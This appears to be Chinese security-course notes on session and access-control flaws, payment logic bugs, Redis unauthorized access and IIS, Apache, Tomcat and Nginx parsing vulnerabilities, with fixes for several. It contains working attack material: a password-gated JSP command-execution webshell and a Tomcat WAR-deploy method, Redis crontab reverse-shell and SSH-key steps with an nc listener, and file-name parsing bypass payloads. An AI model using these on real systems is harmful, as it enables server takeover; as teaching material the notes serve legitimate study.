<p>会话管理问题<br>cookie的属性值expires,就是用于设置cookie过期时间，如果设置<br>一个时间，到期后cookie则失效，如果默认不设置，则为浏览器关闭后cookie失效。令牌的有效时间设置比较重要，时间设置过短，用户还没有访问完就要重新登录，时间设置过长会存在安全问题。令牌失效时间过长，当用户结束访问网站后，令牌仍然有效，那么攻击者劫持成功令牌的概率就会增加。用户注销后，令牌是否有设置失效，如没有该逻辑，那么注销后的令牌仍然合法，攻击者依旧可以以用户身份登录。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706172050633.png" alt="image-20220706172050633"></p>
<h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a><strong>权限控制</strong></h2><p>◼ 权限管理（Authorization）<br>权限管理，一般指根据系统设置的安全规则或者安全策略，用户可以访问而且只能访问自己被授权的资源，不多不少。权限管理几乎出现在任何系统里面，只要有用户和密码的系统。很多人常将“用户身份认证”、“密码加密”、“系统管理”等概念与权限管理概念混淆。用户身份认证是用户要告诉系统“我是谁”，不属于权限管理范畴。密码加密，隶属用户身份认证领域，不属于权限管理范畴。系统管理，一般是系统的一个模块。而且该模块一般还含有权限管理子模块。系统管理里面的权限管理模块，只是一个操作界面，让管理员能够设置角色等安全策略。系统背后还有很多权限验证逻辑，这些都并不属于该模块。总体来说，该模块相当于给权限管理模块提供了一些数据。</p>
<p>■权限管理(Authorization)<br>➢从控制力度来看,可以将权限管理分为两大类:<br>●功能级权限管理<br>●数据级权限管理<br>➢从控制方向来看，也可以将权限管理分为两大类:<br>●从系统获取数据，比如查询订单、查询客户资料<br>●向系统提交数据，比如删除订单、修改客户资料</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706194220707.png" alt="image-20220706194220707"></p>
<p>■权限控制<br>关于权限控制，一般有以下问题:    ➢未授权访问   ➢越权访问</p>
<p><strong>未授权访问</strong><br>当信息系统的安全配置或权限认证的地址，授权页面存在缺陷时，有可能出现未授权访问，导致用户可以访问信息系统，进而操作重要权限、操作数据库、读取网站目录等敏感信息。目前存在未授权访问漏洞主要存在Web应用权限中。正常情况下，管理后台的页面应该只有管理员才能够访问，而且搜索引擎的爬虫也不应该搜索到这些页面，但这些系统未对用户访问权限进行控制，导致任意用户只要构造出了正确URL就能够访问这些页面或者用爬虫爬到页面目录。对于Web应用程序，未授权访问常发生于空口令登录及后台管理页面的访问。空口令多是因为配置问题，允许不输入用户名密码登录，修改配置可避免。后台管理页面应该只有管理员才能访问，正常情况下是不应该被前台访问到的，搜索引擎与爬虫也不应搜索到后台页面，由于系统未对用户访问权限做控制，可能被攻击者用工具或手动尝试出来。</p>
<p>对于数据库或一些服务组件，未授权访问可能由于一些版本中出现的漏洞，导致攻击者能读取数据库信息，读取系统的文件，甚至利用服务写文件至主机上。<br>目前主要存在未授权访问漏洞的服务有：<br>samba服务、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ElasticSearch、Memcache、docker等</p>
<p>◼ 案例：Redis未授权访问<br>Redis是完全开源免费的，遵守BSD协议，是一个高性能的key-value存储系统，是跨平台的非关系型数据库。Redis通常被称为数据结构服务器，因为值（value）可以是字符串、哈希、列表、集合和有序集合等类型，与其他key-value缓存产品有以下三个特点：<br>➢ Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用<br>➢ Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储<br>➢ Redis支持数据的备份，即master-slave模式的数据备份。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706203831675.png" alt="image-20220706203831675"></p>
<p>扫描/连接默认的6379端口<br>➢ 利用方式：<br>● 直接读取数据库中的数据<br>● 向Web目录中写shell：需要猜到Web目录地址<br>● 写ssh-keygen公钥然后使用私钥登陆<br>● 利用crontab反弹shell<br>● 向Web目录中写shell：需要猜到Web目录地址<br>可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save，就可以写入一个路径为a/b的任意文件（需要有Web服务且有写入权限）：<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195353717.png" alt="image-20220706195353717"></p>
<p>● 写ssh-keygen公钥然后使用私钥登陆<br>3、利用私钥成功登录redis服务器</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195540912.png" alt="image-20220706195540912"></p>
<p>● 利用crontab反弹shell<br>连接redis，向crontab中写计划任务，并反弹shell，需要root权限</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195612952.png" alt="image-20220706195612952"></p>
<p>在攻击机上启动nc监听5555端口（未被占用的任意端口），等待反弹shell<br>nc –lvnp 5555<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706195644583.png" alt="image-20220706195644583"></p>
<p>◼ Redis未授权访问防御方法</p>
<p>➢ 可以配置redis.conf文件，在redis安装目录下<br>● 默认只对本地开放bind 127.0.0.1<br>● 添加登陆密码：修改redis.conf文件，添加requirepass password<br>● 在需要对外开放的时候修改默认端口（端口不重复就行）port 2333<br>● 配合iptables限制开放<br>● 降权：以低权限运行 Redis 服务（重启redis才能生效）<br>● 禁止使用root权限启动redis服务</p>
<p>◼ 防御解决方案<br>➢ 隐藏：只能阻止用户无法猜测到后台界面，爆破工具可以扫描大量后台地址<br>➢ 页面权限控制：可以阻挡非认证用户登录后台，即使找到后台链接，也会被认证窗口阻挡</p>
<h2 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h2><p>◼ 业务逻辑<br>业务逻辑广义的认知应该是：软件产品都是在某个领域内实现某些特定业务，所以，软件产品天生应该分解为界面交互部分和业务逻辑部分，其中业务逻辑部分是软件产品的核心，它客观存在于软件产品内部，但是无法对使用者产生直观刺激，因此业务逻辑不能与使用者直接交互。而界面交互部分是业务逻辑与使用者进行交流的接口，使用者通过界面交互部分，与业务进行交流，从而使得软件产品发挥其作用。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706204846203.png" alt="image-20220706204846203"></p>
<p>业务逻辑<br>业务逻辑的内容包括四个部分：<br>领域实体：定义了业务中的对象，对象有属性和行为<br>业务规则：定义了需要完成一个动作，必须满足的条件<br>数据完整性：某些数据不可少<br>工作流：定义了领域实体之间的交互关系<br>以用户网购衣服为例：<br>领域实体：用户、资金账户、订单、衣服、发货单<br>业务规则：用户点击购买就会生成订单，但必须付了钱才会发货，生成发货单<br>数据完整性：网购必须登录网购平台账号，没有账号就不能成功购买<br>工作流：搜索衣服 -&gt; 找到合适衣服 -&gt; 下单购买 -&gt; 付款 -&gt; 收货</p>
<p>每个业务系统都具有不同的业务逻辑，而业务逻辑背后就是人的逻辑， 充分了解业务逻辑有助于找出其中的问题所在。业务逻辑漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能正常处理或处理错误。业务逻辑漏洞出现于业务流程中（模块功能），也就是说网站的部分都有可能存在逻辑错误漏洞。</p>
<p>◼ 业务逻辑<br>常见业务逻辑问题：<br>➢ 支付逻辑<br>➢ 其他业务逻辑</p>
<p>支付逻辑漏洞<br>支付逻辑漏洞是指系统的支付流程中存在业务逻辑层面的漏洞。<br>支付流程通常为：选择商品和数量 → 选择支付和配送方式 → 生成订单 → 订单支付 → 完成<br>最常见的支付逻辑漏洞通常是由于服务器端没有对客户端请求数据中金额、数量等敏感信息做校验。支付逻辑漏洞一般在电子商务网站上容易出现，在支付流程中由于没有对客户端请求数据中的金额、数量等敏感信息作校验，带来“0元购”、“1分购”等漏洞，会对商家带来大量经济损失。</p>
<p>支付逻辑漏洞一般有以下几种情况：<br>➢ 支付过程中修改支付金额<br>➢ 支付过程中修改商品数量<br>➢ 支付过程中修改商品编号</p>
<p>◼ 预防思路<br>➢ 多重校验<br>➢ 人工审核（订单数值较大）</p>
<p>其他业务逻辑问题<br>其他业务逻辑问题一般有以下几种情况：<br>➢ API（应用程序编程接口）逻辑漏洞<br>➢ 客户端与API通信无加密<br>➢ 客户端与API通信无身份验证<br>➢ 其他安全问题</p>
<p>◼ API逻辑漏洞<br>在移动互联网的时代，Web服务已经成为了异构系统之间的互联与集成的主要手段，各种Web服务几乎都采用Web API来构建。通过Http协议的形式来以Get/Post方式发送请求, 返回json格式(数据更小巧且自描述能力强)的数据。Web Api接口的访问方式<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706205142941.png" alt="image-20220706205142941"></p>
<p>◼ API逻辑漏洞常见的安全问题<br>➢ 参数校验不完善<br>➢ 短信、邮箱炸弹<br>➢ 关键参数不加密</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706205205113.png" alt="image-20220706205205113"></p>
<p>◼ 客户端与API通信无加密<br>➢ 未加密风险<br>● 凭据<br>● 传输数据公开<br>● 资源信息泄露<br>➢ 中间人攻击</p>
<p>◼ 客户端与API通信无身份验证<br>➢ 信息泄露<br>➢ 应用程序被克隆<br>➢ 难以应对大规模拒绝服务攻击</p>
<p>◼ 其他安全问题<br>重放攻击的模式：<br>➢ 短信炸弹<br>➢ 重复下单<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706205250479.png" alt="image-20220706205250479"></p>
<p>◼ 其他安全问题<br>➢ 防止重放攻击<br>●时间戳和随机数的方式防止请求被重放</p>
<h1 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h1><h2 id="IIS漏洞"><a href="#IIS漏洞" class="headerlink" title="IIS漏洞"></a>IIS漏洞</h2><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS目前只适用于 Windows系统，不适用于其他操作系统。<br>解析漏洞<br>IIS 6.x 基于文件名 该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析分号及其后面的内容，相当于截断。</p>
<p>基于文件夹名 该版本默认会将 *.asp/目录下的所有文件当成Asp解析。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215251479.png" alt="image-20220706215251479"></p>
<p>1.asp;.jpg webshell文件<br>1.asp -&gt;asp文件解析</p>
<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp，从网站属性-&gt;主目录-&gt;配置 可以看出，他们都是调用了asp.dll进行的解析。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215338492.png" alt="image-20220706215338492"></p>
<p>修复建议<br>由于微软并不认为这是一个漏洞，也没有推出IIS 6.0的补丁，因此漏洞需要自己修复。①限制上传目录执行权限，不允许执行脚本。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215423742.png" alt="image-20220706215423742"></p>
<p>②不允许新建目录。</p>
<p>③上传的文件需经过重命名(时间戳+随机数+.jpg等)</p>
<p>IIS短文件漏洞 Windows 以 8.3 格式生成与 MS-DOS 兼容的短文件名，以允许基于MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入”dir /x”即可看到短文件名的效果。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215515987.png" alt="image-20220706215515987"></p>
<p>IIS短文件名产生：<br>1.当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。<br>2.当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。<br>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。 IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
<p>复现：<br>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。 以下通过开启IIS6.0 ASP.NET后进行复现。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215616031.png" alt="image-20220706215616031"></p>
<p>当访问构造的某个存在的短文件名，会返回404<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215636631.png" alt="image-20220706215636631"></p>
<p>当访问构造的某个不存在的短文件名，会返回400；</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215658988.png" alt="image-20220706215658988"></p>
<p>IIS短文件漏洞局限性</p>
<ol>
<li>如果文件名本身太短也是无法猜解的；</li>
<li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；</li>
<li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；</li>
<li>如果文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报；</li>
<li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215737899.png" alt="image-20220706215737899"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215749108.png" alt="image-20220706215749108"></p>
<p>修复建议<br>1）从CMD命令关闭NTFS8.3文件格式的支持    Windows Server 2003： (1代表关闭，0代表开启） 关闭该功能：fsutil behaviorset disable8dot3 1<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215823874.png" alt="image-20220706215823874"></p>
<p>Windows Server 2008 R2：<br>查询是否开启短文件名功能：fsutil 8dot3namequery 关闭该功能：fsutil 8dot3name set 1不同系统关闭命令稍有区别，该功能默认是开启的.</p>
<p>2）或从修改注册表关闭NTFS 8.3文件格式的支持 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口 找到路径：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706215933465.png" alt="image-20220706215933465"></p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>Apache HTTPD 换行解析漏洞（ C V E - 2 0 1 7 - 1 5 7 1 5 ）<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220012493.png" alt="image-20220706220012493"></p>
<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。<br>漏洞环境<br>编译及运行漏洞环境：<br>docker-compose build<br>docker-compose up -d<br>启动后Apache运行在<a href="http://your-ip:8080。">http://your-ip:8080。</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220044293.png" alt="image-20220706220044293"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220101462.png" alt="image-20220706220101462"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220127856.png" alt="image-20220706220127856"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220139982.png" alt="image-20220706220139982"></p>
<p>访问刚才上传的/1.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220207574.png" alt="image-20220706220207574"></p>
<p><strong>Apache HTTPD 多后解析漏洞</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220334348.png" alt="image-20220706220334348"></p>
<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：<br>AddType text/html .html<br>AddLanguage zh-CN .cn<br>其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。<br>以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器：<br>AddHandler application/x-httpd-php .php<br>那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p>环境运行后，访问<a target="_blank" rel="noopener" href="http://your-ip/uploadfiles/apache.php.jpeg%E5%8D%B3%E5%8F%AF%E5%8F%91%E7%8E%B0%EF%BC%8Cphpinfo%E8%A2%AB%E6%89%A7%E8%A1%8C%E4%BA%86%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BAphp%E8%84%9A%E6%9C%AC%E3%80%82">http://your-ip/uploadfiles/apache.php.jpeg即可发现，phpinfo被执行了，该文件被解析为php脚本。</a><br><a target="_blank" rel="noopener" href="http://your-ip/index.php%E4%B8%AD%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%84%E4%BB%B6%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%AE%8C%E6%88%90%E5%90%8E%E5%B9%B6%E6%9C%AA%E9%87%8D%E5%91%BD%E5%90%8D%E3%80%82%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BAxxx.php.jpg%E6%88%96xxx.php.jpeg%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%88%A9%E7%94%A8Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8Cgetshell%E3%80%82">http://your-ip/index.php中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220355089.png" alt="image-20220706220355089"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220409898.png" alt="image-20220706220409898"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220422172.png" alt="image-20220706220422172"></p>
<h2 id="Tomact"><a href="#Tomact" class="headerlink" title="Tomact"></a>Tomact</h2><p><strong>通过 PUT 方法的 Tomcat 任意写入文件漏洞( C V E - 2 0 1 7 - 1 2 6 1 5 )</strong></p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Tomcat设置了写权限（readonly=<span class="literal">false</span>），导致我们可以将文件写入服务器。</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">	&lt;servlet-<span class="built_in">name</span>&gt;<span class="keyword">default</span>&lt;/servlet-<span class="built_in">name</span>&gt;</span><br><span class="line">	&lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">	&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-<span class="built_in">name</span>&gt;debug&lt;/<span class="built_in">param</span>-<span class="built_in">name</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-value&gt;<span class="number">0</span>&lt;/<span class="built_in">param</span>-value&gt;</span><br><span class="line">	&lt;/init-<span class="built_in">param</span>&gt;</span><br><span class="line">	&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-<span class="built_in">name</span>&gt;listings&lt;/<span class="built_in">param</span>-<span class="built_in">name</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-value&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-value&gt;</span><br><span class="line">	&lt;/init-<span class="built_in">param</span>&gt;</span><br><span class="line">	&lt;init-<span class="built_in">param</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-<span class="built_in">name</span>&gt;readonly&lt;/<span class="built_in">param</span>-<span class="built_in">name</span>&gt;</span><br><span class="line">		&lt;<span class="built_in">param</span>-value&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-value&gt;</span><br><span class="line">	&lt;/init-<span class="built_in">param</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">load</span>-on-startup&gt;<span class="number">1</span>&lt;/<span class="built_in">load</span>-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">虽然Tomcat在一定程度上检查了文件后缀（不能直接写jsp），但是我们还是可以通过一些文件系统的特性</span><br><span class="line">（比如/在Linux中使用）来绕过这个限制。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221010856.png" alt="image-20220706221010856"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221027308.png" alt="image-20220706221027308"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221039854.png" alt="image-20220706221039854"></p>
<p><strong>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</strong></p>
<p>Tomcat支持通过后端部署war文件，所以我们可以直接把webshell放到web目录下。为了访问后端，需要权限。<br>Tomcat7+的权限如下：<br>经理（后台管理）<br>manager-gui（html页面的权限）<br>manager-status（查看状态的权限）<br>manager-script（文本界面权限和状态权限）<br>manager-jmx（jmx 权限和状态权限）<br>host-manager（虚拟主机管理）<br>admin-gui（html页面的权限）<br>admin-script（文本界面的权限）</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221149893.png" alt="image-20220706221149893"><br>什么是基础认证爆破？<br>    1.Tomcat的默认管理入口<br>    2.通过中间件配置<br>基础认证爆破的特点？<br>    其中Authorization这一行才是认证的重点：<br>    Authorization: Basic YWRtaW46MTIzNDU2<br>    他的数据包是Basic+经过base64加密后发送<br>burpsuite如何对其爆破？<br>    payload type选择Custom iterator（自定义迭代器)；<br>    username:password<br>    一共分为三个部分：</p>
<ol>
<li>用户名</li>
<li>:(冒号)</li>
<li>密码</li>
<li>在Payload Processing中点击add添加相应的加密base64,在最后的Payload Encoding中取消urlencode加密特殊字符</li>
</ol>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221323585.png" alt="image-20220706221323585"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221336764.png" alt="image-20220706221336764"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221350632.png" alt="image-20220706221350632"></p>
<p>基础认证爆破<br>最后我们得到密码为<br>Tomcat<br>tomcat</p>
<p>进入之后我们找到下面的上传点,但是它需要传一个war的包,我们先写一个jsp的小马,然后压缩成zip,在把zip改名为war,然后上传即可</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221439042.png" alt="image-20220706221439042"></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Jsp小马：</span><br><span class="line">&lt;% <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.get<span class="constructor">Parameter(<span class="string">&quot;pwd&quot;</span>)</span>))&#123; java.io.InputStream <span class="keyword">in</span> =</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(request.get<span class="constructor">Parameter(<span class="string">&quot;i&quot;</span>)</span>).get<span class="constructor">InputStream()</span>; <span class="built_in">int</span> a = -<span class="number">1</span>;</span><br><span class="line">byte<span class="literal">[]</span> b = <span class="keyword">new</span> byte<span class="literal">[<span class="number">2048</span>]</span>; out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>); <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-</span><br><span class="line"><span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> <span class="constructor">String(<span class="params">b</span>)</span>); &#125; out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>); &#125; %&gt;</span><br></pre></td></tr></table></figure>

<p>上传好小马后我们可以发现路径，未上传的war包是y.war，我们可以发现路径为:Ip/压缩包名/压缩包.jsp，系统会自动的解压该压缩包我们访问<a target="_blank" rel="noopener" href="http://ip/y/y.jsp%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE%E5%B0%8F%E9%A9%AC">http://ip/y/y.jsp就可以成功访问小马</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221529401.png" alt="image-20220706221529401"></p>
<p>访问小马后我们进行命令执行看看<a target="_blank" rel="noopener" href="http://192.168.6.103:8080/y/y.jsp?pwd=023&amp;i=ls%EF%BC%8C%E6%88%90%E5%8A%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%81%EF%BC%81%E5%BD%93%E7%84%B6%E8%BF%98%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E7%9A%84%E5%91%BD%E4%BB%A4">http://192.168.6.103:8080/y/y.jsp?pwd=023&amp;i=ls，成功命令执行！！当然还可以执行其他的命令</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706221603831.png" alt="image-20220706221603831"></p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>N g i n x 文 件 名 逻 辑 漏 洞（ C V E - 2 0 1 3 - 4 5 4 7 ）影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220449850.png" alt="image-20220706220449850"></p>
<p>漏洞原理<br>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：<br>location ~ .php$ {<br>    include    fastcgi_params;<br>    fastcgi_pass 127.0.0.1:9000;<br>    fastcgi_index index.php;<br>    fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;<br>    fastcgi_param DOCUMENT_ROOT /var/www/html;<br>}<br>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p>
<p>而存在CVE-2013-4547的情况下，我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$，可<br>以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是1.gif[0x20]，就设置其为<br>SCRIPT<br>_<br>FILENAME的值发送给fastcgi。<br>fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。再举个例子，比如很多网站限制了允许访问后台的IP：<br>location /admin/ {<br>    allow 127.0.0.1;<br>    deny all;<br>}<br>我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是/test[0x20]/../admin/index.php文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫“test ”：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220611979.png" alt="image-20220706220611979"></p>
<p>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个“1.gif ”，注<br>意后面的空格：访问<a target="_blank" rel="noopener" href="http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%8F%91%E7%8E%B0PHP%E5%B7%B2%E8%A2%AB%E8%A7%A3%E6%9E%90%EF%BC%9A![image-20220706220642429](./HW%E8%AF%BE%E7%A8%8B/image-20220706220642429.png)">http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php，即可发现PHP已被解析：![image-20220706220642429](./HW%E8%AF%BE%E7%A8%8B/image-20220706220642429.png)</a></p>
<p>Nginx解析漏洞复现。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220723291.png" alt="image-20220706220723291"></p>
<p>版本信息：Nginx 1.x 最新版    PHP 7.x最新版<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
<p>访问<a target="_blank" rel="noopener" href="http://your-ip/uploadfiles/nginx.png%E5%92%8Chttp://your-ip/uploadfiles/nginx.png/.php">http://your-ip/uploadfiles/nginx.png和http://your-ip/uploadfiles/nginx.png/.php</a> 即可查看效果。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220753637.png" alt="image-20220706220753637"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220706220807528.png" alt="image-20220706220807528"></p>
